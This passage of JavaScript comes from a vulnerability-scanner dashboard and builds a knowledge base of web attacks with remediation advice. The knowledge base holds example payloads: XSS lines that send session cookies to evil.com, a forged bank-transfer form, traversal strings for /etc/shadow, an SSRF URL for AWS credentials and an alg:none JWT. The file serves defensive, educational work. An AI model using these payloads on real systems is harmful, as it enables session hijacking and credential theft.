      'Attacker\'s script executes in the victim\'s browser in the site\'s origin',
      'Attacker can steal cookies, hijack sessions, deface the page, or deliver malware'
    ],
    payloads: [
      { label: 'Basic Alert', code: '\x3cscript>alert(document.cookie)<\/script>' },
      { label: 'Img onerror', code: '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">' },
      { label: 'SVG onload', code: '<svg onload=eval(atob(\'BASE64_PAYLOAD\'))>' },
      { label: 'DOM XSS', code: 'javascript:void(document.write(\'\x3cscript>...<\\/script>\'))' }
    ],
    queryDemo: {
      before: `<span class="cmt">// Server renders:</span>\n<p>Hello, <span class="hi pay">[USERNAME]</span>!</p>`,
      after: `<p>Hello, <span class="hi pay">&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</span>!</p>\n<span class="cmt">// Browser executes injected script, exfiltrating session cookie</span>`
    },
    fixes: [
      { icon: '✅', text: 'HTML-encode all output: & → &amp; < → &lt; > → &gt; " → &quot;' },
      { icon: '✅', text: 'Use a Content Security Policy (CSP) header to restrict script origins' },
      { icon: '✅', text: 'Use framework auto-escaping (React JSX, Django templates, Jinja2)' },
      { icon: '✅', text: 'Set HttpOnly and Secure flags on session cookies to limit JS access' },
      { icon: '✅', text: 'Avoid innerHTML; use textContent / innerText for untrusted data' }
    ],
    references: [{ label: 'OWASP XSS', url: 'https://owasp.org/www-community/attacks/xss/' }, { label: 'PortSwigger XSS Labs', url: 'https://portswigger.net/web-security/cross-site-scripting' }]
  },
  csrf: {
    name: 'Cross-Site Request Forgery',
    icon: '🔄',
    cwe: 'CWE-352',
    owasp: 'A01:2021',
    description: 'CSRF tricks an authenticated user\'s browser into sending a forged request to a trusted site. Since the browser automatically attaches session cookies, the server cannot distinguish the forged request from a legitimate one without additional validation.',
    howItWorks: [
      'Victim is logged in to a target site (e.g. their bank)',
      'Victim visits an attacker-controlled page (email link, ad, forum post)',
      'Attacker\'s page silently issues a cross-origin request to the target',
      'Target site receives the request with the victim\'s cookies and acts on it'
    ],
    payloads: [
      { label: 'HTML Form', code: '<form action="https://bank.com/transfer" method="POST">\n  <input name="to" value="attacker">\n  <input name="amount" value="10000">\n</form>\n\x3cscript>document.forms[0].submit()<\/script>' },
      { label: 'Image GET', code: '<img src="https://target.com/delete?id=123" style="display:none">' }
    ],
    queryDemo: {
      before: `<span class="cmt">// Victim's browser automatically sends:</span>\nPOST /transfer HTTP/1.1\nHost: bank.com\nCookie: <span class="hi pay">session=victim_token</span>\n\nto=attacker&amount=10000`,
      after: `<span class="cmt">// Server sees a valid authenticated request</span>\n<span class="cmt">// and processes the transfer — no way to tell it's forged</span>`
    },
    fixes: [
      { icon: '✅', text: 'Implement synchroniser CSRF tokens — include a secret random value in every state-changing form' },
      { icon: '✅', text: 'Use SameSite=Strict or Lax cookie attribute to prevent cross-origin cookie sending' },
      { icon: '✅', text: 'Validate the Origin and Referer headers on the server side' },
      { icon: '✅', text: 'Require re-authentication for high-impact actions (password change, payment)' }
    ],
    references: [{ label: 'OWASP CSRF', url: 'https://owasp.org/www-community/attacks/csrf' }]
  },
  lfi: {
    name: 'Path Traversal / LFI',
    icon: '📂',
    cwe: 'CWE-22',
    owasp: 'A01:2021',
    description: 'Path traversal (also Local File Inclusion) lets an attacker read arbitrary files on the server by injecting ../ sequences into file-path parameters. This can expose sensitive config files, credentials, and source code.',
    howItWorks: [
      'Application uses user input to construct a file path',
      'Input is not sanitised — ../ sequences traverse up directories',
      'Server opens and returns the requested file outside the web root',
      'Attacker reads /etc/passwd, .env files, SSH keys, application source code'
    ],
    payloads: [
      { label: 'Unix', code: '../../../../etc/passwd' },
      { label: 'Windows', code: '..\\..\\..\\windows\\win.ini' },
      { label: 'URL-encoded', code: '%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { label: 'Null-byte', code: '../../../../etc/passwd%00.jpg' }
    ],
    queryDemo: {
      before: `GET /download?file=<span class="hi pay">report.pdf</span> HTTP/1.1\n\n<span class="cmt">// Server: open("/var/www/files/" + file)</span>`,
      after: `GET /download?file=<span class="hi pay">../../../../etc/shadow</span> HTTP/1.1\n\n<span class="cmt">// Server opens /etc/shadow — exposes hashed passwords</span>`
    },
    fixes: [
      { icon: '✅', text: 'Use allowlists — only permit known filenames, never raw user input in file paths' },
      { icon: '✅', text: 'Resolve the canonical path and assert it starts with the intended base directory' },
      { icon: '✅', text: 'Strip and reject ../ sequences and URL-encoded equivalents before processing' },
      { icon: '✅', text: 'Sandbox the application with chroot or container to limit file system access' }
    ],
    references: [{ label: 'OWASP Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal' }]
  },
  ssrf: {
    name: 'Server-Side Request Forgery',
    icon: '🌐',
    cwe: 'CWE-918',
    owasp: 'A10:2021',
    description: 'SSRF lets an attacker make the server issue HTTP requests to arbitrary destinations — including internal services, cloud metadata endpoints, and localhost — that are otherwise unreachable from the public internet.',
    howItWorks: [
      'Application fetches a URL supplied by the user (e.g. webhook, image proxy)',
      'Attacker provides an internal URL instead of an external one',
      'Server issues the request from its own network context',
      'Response can expose internal APIs, AWS metadata, admin panels'
    ],
    payloads: [
      { label: 'AWS Metadata', code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
      { label: 'Localhost', code: 'http://localhost:6379/  (Redis)' },
      { label: 'Internal svc', code: 'http://internal-api.corp/admin' },
      { label: 'DNS Rebinding', code: 'http://attacker.com  → resolves to 192.168.1.1' }
    ],
    queryDemo: {
      before: `POST /fetch-url\n{ "url": "<span class="hi pay">https://example.com/image.png</span>" }\n\n<span class="cmt">// Server fetches the image and returns it</span>`,
      after: `POST /fetch-url\n{ "url": "<span class="hi pay">http://169.254.169.254/latest/meta-data/iam/security-credentials/role</span>" }\n\n<span class="cmt">// Server returns AWS IAM keys to the attacker!</span>`
    },
    fixes: [
      { icon: '✅', text: 'Allowlist permitted URL schemes and destination domains/IPs' },
      { icon: '✅', text: 'Block requests to RFC-1918 private ranges (10.x, 172.16.x, 192.168.x) and 169.254.x' },
      { icon: '✅', text: 'Resolve and validate DNS before making the request — block internal IP resolutions' },
      { icon: '✅', text: 'Use a dedicated egress proxy that enforces access controls' }
    ],
    references: [{ label: 'OWASP SSRF', url: 'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/' }]
  },
  auth: {
    name: 'Broken Authentication',
    icon: '🔐',
    cwe: 'CWE-287',
    owasp: 'A07:2021',
    description: 'Broken authentication covers flaws in session management, credential handling, and identity verification. Issues include weak session tokens, missing brute-force protection, insecure "remember me" implementations, and JWT vulnerabilities.',
    howItWorks: [
      'Application issues weak or predictable session tokens',
      'No rate-limiting allows brute-force of passwords or tokens',
      'JWT signed with "alg:none" or a weak secret is accepted',
      'Session tokens are not invalidated on logout'
    ],
    payloads: [
      { label: 'JWT alg:none', code: '{"alg":"none","typ":"JWT"}.{"sub":"admin"}.  (no signature)' },
      { label: 'Brute-force', code: 'POST /login  password=password123  (no lockout)' },
      { label: 'Weak token', code: 'session=1001  →  try session=1002, 1003 ...' }
    ],
    queryDemo: {
      before: `<span class="cmt">// Normal JWT (RS256):</span>\neyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.<span class="str">validSignature</span>`,
      after: `<span class="cmt">// Attacker sends alg:none token — no signature needed:</span>\neyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.<span class="pay">           </span>\n<span class="cmt">// Vulnerable server accepts it and grants admin access</span>`
    },
    fixes: [
      { icon: '✅', text: 'Use a strong, randomly-generated session token (128-bit entropy minimum)' },
      { icon: '✅', text: 'Reject JWTs that specify alg:none or allow algorithm confusion attacks' },
      { icon: '✅', text: 'Enforce account lockout or exponential back-off after failed login attempts' },
      { icon: '✅', text: 'Invalidate server-side session state on logout — do not rely solely on client deletion' },
      { icon: '✅', text: 'Require MFA for privileged accounts' }
    ],
    references: [{ label: 'OWASP Auth', url: 'https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication' }]
  },
  headers: {
    name: 'Missing Security Headers',
    icon: '📋',
    cwe: 'CWE-693',
    owasp: 'A05:2021',
    description: 'HTTP security headers instruct browsers to enable built-in protections. Missing headers leave users vulnerable to clickjacking, MIME sniffing, XSS (no CSP), and information leakage through server banners.',
    howItWorks: [
      'Browser requests a page — server responds without protective headers',
      'No Content-Security-Policy means any injected script can execute',
      'No X-Frame-Options allows the page to be embedded in an iframe (clickjacking)',
      'Server header reveals exact software version, aiding targeted exploits'
    ],
    payloads: [
      { label: 'Clickjacking', code: '<iframe src="https://target.com/transfer" style="opacity:0;position:absolute"></iframe>\n<button style="position:absolute">Click Me!</button>' },
      { label: 'MIME Sniff', code: 'Serving text/plain with JS content — browser executes it anyway' }
    ],
    queryDemo: {
      before: `HTTP/1.1 200 OK\nServer: <span class="hi pay">Apache/2.4.51 (Unix)</span>\nContent-Type: text/html\n<span class="cmt">// No CSP, no X-Frame-Options, no HSTS</span>`,
      after: `HTTP/1.1 200 OK\n<span class="str">Content-Security-Policy: default-src 'self'</span>\n<span class="str">X-Frame-Options: DENY</span>\n<span class="str">Strict-Transport-Security: max-age=31536000</span>\n<span class="str">X-Content-Type-Options: nosniff</span>`
    },
    fixes: [
      { icon: '✅', text: 'Add Content-Security-Policy with a strict default-src and specific allowlists' },
      { icon: '✅', text: 'Set X-Frame-Options: DENY or use CSP frame-ancestors directive' },
      { icon: '✅', text: 'Enable Strict-Transport-Security (HSTS) with a long max-age and includeSubDomains' },
      { icon: '✅', text: 'Set X-Content-Type-Options: nosniff to prevent MIME confusion' },
      { icon: '✅', text: 'Remove or genericise the Server header to avoid version disclosure' }
    ],
    references: [{ label: 'OWASP Secure Headers', url: 'https://owasp.org/www-project-secure-headers/' }]
  },
  tls: {
    name: 'TLS / SSL Misconfiguration',
    icon: '🔒',
    cwe: 'CWE-326',
    owasp: 'A02:2021',
    description: 'Weak TLS configurations allow network attackers to downgrade connections, intercept traffic, or exploit known protocol vulnerabilities. Issues include TLS 1.0/1.1 support, weak cipher suites, self-signed certificates, and BEAST/POODLE attacks.',
    howItWorks: [
      'Client and server negotiate the highest mutually supported TLS version',
      'If TLS 1.0/1.1 is enabled, an attacker can force a downgrade',
      'Older protocol versions are vulnerable to known cryptographic attacks',
      'Weak ciphers (RC4, 3DES, NULL) expose decrypted traffic'
    ],
    payloads: [
      { label: 'Downgrade', code: 'openssl s_client -tls1 -connect target.com:443' },
      { label: 'BEAST PoC', code: 'TLS 1.0 CBC cipher chosen-plaintext attack on session cookie' },
      { label: 'Cert bypass', code: 'Self-signed cert accepted by client — MITM possible' }
    ],
    queryDemo: {
      before: `<span class="cmt">// Attacker intercepts TLS 1.0 handshake:</span>\nClientHello: TLS 1.0\nServerHello: <span class="hi pay">TLS 1.0 + RC4 cipher</span>\n<span class="cmt">// RC4 keystream bias — traffic decryptable over time</span>`,
      after: `<span class="cmt">// Hardened server rejects legacy protocols:</span>\nClientHello: TLS 1.0 → <span class="str">ServerHello: ALERT handshake_failure</span>\n<span class="cmt">// Only TLS 1.2+ with AEAD ciphers accepted</span>`
    },
    fixes: [
      { icon: '✅', text: 'Disable TLS 1.0 and 1.1; accept only TLS 1.2 and 1.3' },
      { icon: '✅', text: 'Configure AEAD cipher suites (AES-GCM, ChaCha20-Poly1305) and disable RC4/3DES' },
      { icon: '✅', text: 'Use certificates from a trusted CA — never deploy self-signed certs in production' },
      { icon: '✅', text: 'Enable HSTS preloading to prevent protocol downgrade via HTTP' },
      { icon: '✅', text: 'Run regular SSL Labs scans (ssllabs.com/ssltest) to detect misconfigurations' }
    ],
    references: [{ label: 'SSL Labs Best Practices', url: 'https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices' }]
  }
};

// Map vuln titles to KB keys
function matchKB(vuln) {
  const t = (vuln.title + ' ' + (vuln.check || '') + ' ' + (vuln.desc || '')).toLowerCase();
  if (t.includes('sql') || t.includes('sqli')) return 'sqli';
  if (t.includes('xss') || t.includes('cross-site scripting') || /\bscript\b/.test(t)) return 'xss';
  if (t.includes('csrf') || t.includes('cross-site request')) return 'csrf';
  if (t.includes('path') || t.includes('traversal') || t.includes('lfi') || t.includes('directory listing')) return 'lfi';
  if (t.includes('ssrf') || t.includes('server-side request')) return 'ssrf';
  if (t.includes('auth') || t.includes('jwt') || /\bsession\b/.test(t) || t.includes('token') || t.includes('bola') || t.includes('password')) return 'auth';
  if (t.includes('header') || t.includes('csp') || t.includes('hsts') || t.includes('frame') || t.includes('server version') || t.includes('disclosure') || t.includes('clickjack')) return 'headers';
  if (t.includes('tls') || t.includes('ssl') || t.includes('certificate') || t.includes('cipher')) return 'tls';
  return null;
}

let selectedVulnId = null;
let currentScanId = null;

function clearScanFilter() {
  currentScanId = null;
  renderVulns();
}

function closeVulnDetail() {
  const panel = document.getElementById('vuln-detail-panel');
  const layout = document.getElementById('vulns-layout');
  if (panel) panel.style.display = 'none';
  if (layout) layout.style.gridTemplateColumns = '1fr';
  selectedVulnId = null;
  renderVulns();
}


function renderVulns() {
  const filter = document.getElementById('vuln-filter').value;
  const search = (document.getElementById('vuln-search')?.value || '').toLowerCase();
  let list = currentScanId ? state.vulns.filter(v => v.scanId === currentScanId) : [...state.vulns];
  if (filter) list = list.filter(v => v.severity === filter);
  if (search) list = list.filter(v => v.title.toLowerCase().includes(search) || (v.desc || '').toLowerCase().includes(search) || (v.url || '').toLowerCase().includes(search));
  list.sort((a, b) => { const o = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }; return (o[a.severity] ?? 5) - (o[b.severity] ?? 5); });

  const el = document.getElementById('vuln-table');

  // Show scan filter banner
  const bannerEl = document.getElementById('vuln-scan-banner');
  if (currentScanId) {
    const scan = state.scans.find(s => s.id === currentScanId);
    const scanUrl = scan ? scan.url : 'current scan';
    bannerEl.innerHTML = `<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.25);border-radius:9px;margin-bottom:10px;font-size:12px">
          <span style="color:var(--text2)">🔍 Showing results for: <span style="color:var(--cyan);font-family:var(--mono)">${scanUrl.length > 60 ? scanUrl.slice(0, 60) + '…' : scanUrl}</span></span>
          <button class="btn btn-g btn-xs" onclick="clearScanFilter()">Show All Scans ✕</button>
        </div>`;
    bannerEl.style.display = 'block';
  } else {
    bannerEl.innerHTML = '';
    bannerEl.style.display = 'none';
  }
  if (!list.length) {
    el.innerHTML = '<div class="ph" style="padding:40px">No vulnerabilities match — run a scan or adjust filters</div>';
    document.getElementById('vuln-detail-panel').style.display = 'none';
    document.getElementById('vulns-layout').style.gridTemplateColumns = '1fr';
    return;
  }
  el.innerHTML = `<table class="tbl"><thead><tr>
    <th style="width:36px"></th>
    <th>Title</th><th>Severity</th>
    <th>URL</th><th>Date</th>
    <th style="width:40px"></th>
  </tr></thead><tbody>
    ${list.map(v => {
    const kb = matchKB(v);
    const kbInfo = kb ? VULN_KB[kb] : null;
    return `<tr onclick="showVulnDetail('${v.id}')" class="${v.id === selectedVulnId ? 'selected-row' : ''}">
        <td style="font-size:18px;text-align:center">${kbInfo ? kbInfo.icon : '⚠️'}</td>
        <td>
          <div style="font-weight:700;font-size:13px">${v.title}</div>
          <div style="font-size:10.5px;color:var(--text3);margin-top:1px">${v.cwe || (kbInfo ? kbInfo.cwe : '')} ${kbInfo && kbInfo.owasp ? '· ' + kbInfo.owasp : ''}</div>
        </td>
        <td><span class="badge ${BADGE_MAP[v.severity] || 'bi'}">${v.severity}</span></td>
        <td style="font-family:var(--mono);font-size:11px;color:var(--text3);max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${(v.url || '').slice(0, 42)}${(v.url || '').length > 42 ? '…' : ''}</td>
        <td style="font-size:11px;color:var(--text3);white-space:nowrap">${fmtDate(v.ts)}</td>
        <td><button class="btn btn-d btn-xs" onclick="event.stopPropagation();deleteVuln('${v.id}')">✕</button></td>
      </tr>`;
  }).join('')}
  </tbody></table>
  <div class="search-none">No findings match your search.</div>
  <div style="font-size:11px;color:var(--text3);padding:8px 12px;border-top:1px solid var(--border)">${list.length} issue${list.length !== 1 ? 's' : ''} · click any row to view attack details</div>`;
}

function showVulnDetail(id) {
  selectedVulnId = id;
  const v = state.vulns.find(x => x.id === id);
  if (!v) return;
  const kb = matchKB(v);
  const kbInfo = kb ? VULN_KB[kb] : null;
  const panel = document.getElementById('vuln-detail-panel');
  const layout = document.getElementById('vulns-layout');
  layout.style.gridTemplateColumns = '1fr 420px';
  panel.style.display = 'block';

  const sevBg = { critical: 'rgba(239,68,68,.15)', high: 'rgba(249,115,22,.15)', medium: 'rgba(234,179,8,.13)', low: 'rgba(99,102,241,.15)', info: 'rgba(34,197,94,.12)' };
  const sevClr = { critical: '#fca5a5', high: '#fdba74', medium: '#fcd34d', low: '#93c5fd', info: '#86efac' };

  if (!kbInfo) {
    panel.innerHTML = `<div class="vd-panel">
      <div class="vd-header">
        <span class="vd-sev-badge" style="background:${sevBg[v.severity]};color:${sevClr[v.severity]}">${v.severity.toUpperCase()}</span>
        <div class="vd-title">${v.title}</div>
      </div>
      <div class="vd-url">🔗 ${v.url || 'N/A'}</div>
      <div class="vd-section"><div class="vd-section-title">📄 Description</div><div class="vd-desc">${v.desc || 'No description available.'}</div></div>
      <div style="margin-top:16px"><button class="btn btn-d btn-sm" onclick="deleteVuln('${v.id}')">🗑 Remove Finding</button></div>
    </div>`;
  } else {
    panel.innerHTML = `<div class="vd-panel">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:4px">
        <div style="font-size:22px">${kbInfo.icon}</div>
        <button class="btn btn-g btn-xs" onclick="closeVulnDetail()">✕</button>
      </div>
      <div class="vd-header">
        <span class="vd-sev-badge" style="background:${sevBg[v.severity]};color:${sevClr[v.severity]}">${v.severity.toUpperCase()}</span>
        <div>
          <div class="vd-title">${v.title}</div>
          <div style="font-size:11px;color:var(--text3);margin-top:2px">${v.cwe || (kbInfo ? kbInfo.cwe : '')} &nbsp;·&nbsp; ${kbInfo && kbInfo.owasp ? 'OWASP ' + kbInfo.owasp : 'ZAP Finding'}</div>
        </div>
      </div>
      <div class="vd-url">🔗 ${v.url || 'N/A'}</div>

      <!-- Description -->
      <div class="vd-section">
        <div class="vd-section-title">📄 What is it?</div>
        <div class="vd-desc">${kbInfo.description}</div>
      </div>

      <!-- How it works -->
      <div class="vd-section">
        <div class="vd-section-title">⚙️ How it works</div>
        ${kbInfo.howItWorks.map((s, i) => `<div class="vd-step"><div class="vd-step-num">${i + 1}</div><div style="color:var(--text2);line-height:1.55">${s}</div></div>`).join('')}
      </div>

      <!-- Attack demo -->
      <div class="vd-section">
        <div class="vd-section-title">🎯 Attack Demo</div>
        <div style="font-size:10.5px;color:var(--text3);margin-bottom:4px">Normal input:</div>
        <div class="vd-code-block">${kbInfo.queryDemo.before}</div>
        <div style="font-size:10.5px;color:var(--text3);margin-bottom:4px;margin-top:8px">Malicious payload injected:</div>
        <div class="vd-code-block">${kbInfo.queryDemo.after}</div>
      </div>

      <!-- Payloads -->
      <div class="vd-section">
        <div class="vd-section-title">💣 Example Payloads</div>
        ${kbInfo.payloads.map(p => `
          <div style="margin-bottom:8px">
            <div style="font-size:10.5px;color:var(--text3);margin-bottom:3px;font-weight:600">${p.label}</div>
            <div class="vd-code-block" style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px">
              <span class="pay" style="flex:1;word-break:break-all">${p.code.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>
              <button class="btn btn-g btn-xs" style="flex-shrink:0;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(p.code)});toast('Copied!','success')">📋</button>
            </div>
          </div>`).join('')}
      </div>

      <!-- Remediation -->
      <div class="vd-section">
        <div class="vd-section-title">🛡️ How to fix</div>
        <div style="background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.15);border-radius:10px;padding:12px">
          ${kbInfo.fixes.map(f => `<div class="vd-fix-item"><div class="vd-fix-ico">${f.icon}</div><div>${f.text}</div></div>`).join('')}
        </div>
      </div>

      <!-- References -->
      <div class="vd-section" style="margin-bottom:8px">
        <div class="vd-section-title">🔗 References</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px">
          ${kbInfo.references.map(r => `<a href="${r.url}" target="_blank" style="font-size:11.5px;color:var(--cyan);text-decoration:none;padding:3px 9px;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.15);border-radius:6px;display:inline-flex;align-items:center;gap:4px">↗ ${r.label}</a>`).join('')}
        </div>
      </div>

      <div style="padding-top:12px;border-top:1px solid var(--border)">
        <button class="btn btn-d btn-sm" onclick="deleteVuln('${v.id}')">🗑 Remove Finding</button>
      </div>
    </div>`;
  }

  // Highlight selected row
  document.querySelectorAll('.tbl tr').forEach(r => r.classList.remove('selected-row'));
  renderVulns();
}

function deleteVuln(id) {
  if (id === selectedVulnId) {
    document.getElementById('vuln-detail-panel').style.display = 'none';
    document.getElementById('vulns-layout').style.gridTemplateColumns = '1fr';
    selectedVulnId = null;
  }
  state.vulns = state.vulns.filter(v => v.id !== id);
  save(); renderVulns(); toast('Vulnerability removed', 'info');
}

// ==================== REPORTS ====================
// ==================== REPORTS ====================

function renderReports() {
  const el = document.getElementById('report-list');

  // Populate diff dropdowns
  setTimeout(() => {
    const sa = document.getElementById('diff-scan-a');
    const sb = document.getElementById('diff-scan-b');
    if (sa && sb) {
      const sortedScans = [...state.scans].sort((x, y) => y.ts - x.ts);
      const options = '<option value="">— Select a scan —</option>' +
        sortedScans.map(s => `<option value="${s.id}">${s.url} (${fmtDate(s.ts)}) [${s.vulnCount} issues]</option>`).join('');
      const valA = sa.value;
      const valB = sb.value;
      sa.innerHTML = options;
      sb.innerHTML = options;
      if (valA) sa.value = valA;
      if (valB) sb.value = valB;
    }
  }, 0);

  if (!state.scans.length) {
    el.innerHTML = `<div class="card" style="text-align:center;padding:40px">
      <div style="font-size:36px;margin-bottom:12px">📋</div>
      <div style="font-weight:700;font-size:16px;margin-bottom:6px">No scans yet</div>
      <div style="color:var(--text3);font-size:13px;margin-bottom:16px">Run a scan first to generate reports</div>
      <button class="btn btn-p btn-sm" onclick="nav('scanner')">🔍 Start Scanning</button>
    </div>`;
    return;
  }
  const scans = [...state.scans].sort((a, b) => b.ts - a.ts);
  const totalVulns = state.vulns.length;
  const critCount = state.vulns.filter(v => v.severity === 'critical').length;
  const highCount = state.vulns.filter(v => v.severity === 'high').length;

  el.innerHTML = `
    <div class="card" style="margin-bottom:14px;background:linear-gradient(135deg,rgba(99,102,241,.12),rgba(168,85,247,.08));border-color:rgba(99,102,241,.3)">
      <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap">
        <div style="flex:1;min-width:180px">
          <div style="font-size:13px;font-weight:800;margin-bottom:2px">📊 Overall Assessment</div>
          <div style="font-size:12px;color:var(--text3)">${scans.length} scan${scans.length !== 1 ? 's' : ''} · ${totalVulns} total issue${totalVulns !== 1 ? 's' : ''} · ${new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</div>
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap">
          ${critCount ? `<div style="text-align:center"><div style="font-size:22px;font-weight:900;color:var(--red)">${critCount}</div><div style="font-size:10px;color:var(--text3);font-weight:700;text-transform:uppercase">Critical</div></div>` : ''}
          ${highCount ? `<div style="text-align:center"><div style="font-size:22px;font-weight:900;color:var(--orange)">${highCount}</div><div style="font-size:10px;color:var(--text3);font-weight:700;text-transform:uppercase">High</div></div>` : ''}
          <div style="text-align:center"><div style="font-size:22px;font-weight:900;color:var(--text)">${totalVulns}</div><div style="font-size:10px;color:var(--text3);font-weight:700;text-transform:uppercase">Total</div></div>
        </div>
      </div>
    </div>
    ${scans.map(s => {
    const vulns = state.vulns.filter(v => v.scanId === s.id);
    const crit = vulns.filter(v => v.severity === 'critical').length;
    const high = vulns.filter(v => v.severity === 'high').length;
    const med = vulns.filter(v => v.severity === 'medium').length;
    const low = vulns.filter(v => v.severity === 'low').length;
    const inf = vulns.filter(v => v.severity === 'info').length;
    const riskColor = crit ? 'var(--red)' : high ? 'var(--orange)' : med ? 'var(--yellow)' : 'var(--green)';
    const riskLabel = crit ? 'CRITICAL' : high ? 'HIGH' : med ? 'MEDIUM' : low ? 'LOW' : 'CLEAN';
    return `<div class="card" style="margin-bottom:12px">
        <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap">
          <div style="flex:1;min-width:200px">
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;flex-wrap:wrap">
              <div style="font-weight:800;font-size:14px;font-family:var(--mono);word-break:break-all">${s.url}</div>
              <span style="background:${crit ? 'rgba(239,68,68,.15)' : high ? 'rgba(249,115,22,.15)' : med ? 'rgba(234,179,8,.12)' : 'rgba(34,197,94,.12)'};color:${riskColor};font-size:10px;font-weight:800;padding:2px 8px;border-radius:20px;flex-shrink:0">${riskLabel}</span>
            </div>
            <div style="font-size:11.5px;color:var(--text3);margin-bottom:10px">🔍 ${s.profile} &nbsp;·&nbsp; 📅 ${fmtDate(s.ts)} &nbsp;·&nbsp; ⚠️ ${s.vulnCount} issue${s.vulnCount !== 1 ? 's' : ''}</div>
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px">
              ${crit ? `<span class="badge bc">● ${crit} Critical</span>` : ''}
              ${high ? `<span class="badge bh">● ${high} High</span>` : ''}
              ${med ? `<span class="badge bm">● ${med} Medium</span>` : ''}
              ${low ? `<span class="badge bl">● ${low} Low</span>` : ''}
              ${inf ? `<span class="badge bi">● ${inf} Info</span>` : ''}
              ${!vulns.length ? `<span class="badge bi">✅ No issues</span>` : ''}
            </div>
          </div>
          <div style="display:flex;flex-direction:column;gap:7px;min-width:170px">
            <button class="btn btn-p btn-sm" style="justify-content:center" onclick="exportHTML('${s.id}')">📄 HTML Report</button>
            <button class="btn btn-g btn-sm" style="justify-content:center" onclick="exportCSV('${s.id}')">📊 CSV Export</button>
            <button class="btn btn-d btn-sm" style="justify-content:center" onclick="exportJSONReport('${s.id}')">{ } JSON Export</button>
            <button class="btn btn-g btn-sm" style="justify-content:center" onclick="printScanReport('${s.id}')">🖨️ PDF / Print</button>
          </div>
        </div>
        ${vulns.length ? `<div style="border-top:1px solid var(--border);padding-top:10px;margin-top:2px">
          <div style="font-size:10px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px">Top Findings</div>
          ${vulns.sort((a, b) => { const o = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }; return o[a.severity] - o[b.severity]; }).slice(0, 3).map(v =>
      `<div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px">
              <span class="badge ${BADGE_MAP[v.severity] || 'bi'}" style="flex-shrink:0">${v.severity}</span>
              <span style="color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${v.title}</span>
            </div>`).join('')}
          ${vulns.length > 3 ? `<div style="font-size:11px;color:var(--text3);padding-top:5px">+${vulns.length - 3} more findings</div>` : ''}
        </div>` : ''}
      </div>`;
  }).join('')}
  `;
}

function buildHTMLReport(scanIds) {
  const isAll = !scanIds;
  const scans = isAll ? [...state.scans].sort((a, b) => b.ts - a.ts) : state.scans.filter(s => scanIds.includes(s.id));
  const allVulns = isAll ? [...state.vulns] : state.vulns.filter(v => scanIds.includes(v.scanId));
  const sevOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  const sevColor = { critical: '#ef4444', high: '#f97316', medium: '#d97706', low: '#4f46e5', info: '#16a34a' };
  const sevBg = { critical: '#fef2f2', high: '#fff7ed', medium: '#fefce8', low: '#eef2ff', info: '#f0fdf4' };
  const sevBorder = { critical: '#fca5a5', high: '#fdba74', medium: '#fde68a', low: '#a5b4fc', info: '#86efac' };
  const critCount = allVulns.filter(v => v.severity === 'critical').length;
  const highCount = allVulns.filter(v => v.severity === 'high').length;
  const medCount = allVulns.filter(v => v.severity === 'medium').length;
  const lowCount = allVulns.filter(v => v.severity === 'low').length;
  const infCount = allVulns.filter(v => v.severity === 'info').length;
  const riskScore = Math.min(critCount * 30 + highCount * 15 + medCount * 6 + lowCount * 2, 100);
  const riskLabel = riskScore === 0 ? 'Clean' : riskScore < 30 ? 'Low' : riskScore < 60 ? 'Medium' : riskScore < 80 ? 'High' : 'Critical';
  const riskClr = riskScore === 0 ? '#16a34a' : riskScore < 30 ? '#16a34a' : riskScore < 60 ? '#d97706' : riskScore < 80 ? '#ea580c' : '#dc2626';
  const now = new Date().toLocaleDateString('en-GB', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' });
  const user = state.user?.name || state.user?.username || 'VulnScan User';

  const vulnRows = allVulns.sort((a, b) => (sevOrder[a.severity] ?? 5) - (sevOrder[b.severity] ?? 5)).map((v, i) => `
    <tr>
      <td style="text-align:center;color:#6b7280;font-size:13px">${i + 1}</td>
      <td><strong style="font-size:13px">${v.title}</strong><br><span style="font-size:11px;color:#6b7280">${v.desc ? v.desc.slice(0, 120) + (v.desc.length > 120 ? '…' : '') : ''}</span></td>
      <td><span style="background:${sevBg[v.severity]};color:${sevColor[v.severity]};border:1px solid ${sevBorder[v.severity]};padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700;text-transform:uppercase;white-space:nowrap">${v.severity}</span></td>
      <td style="font-family:monospace;font-size:11px;color:#374151;word-break:break-all">${v.url || '—'}</td>
      <td style="font-size:12px;color:#6b7280;white-space:nowrap">${fmtDate(v.ts)}</td>
    </tr>`).join('');

  const scanRows = scans.map(s => {
    const sv = state.vulns.filter(v => v.scanId === s.id);
    return `<tr>
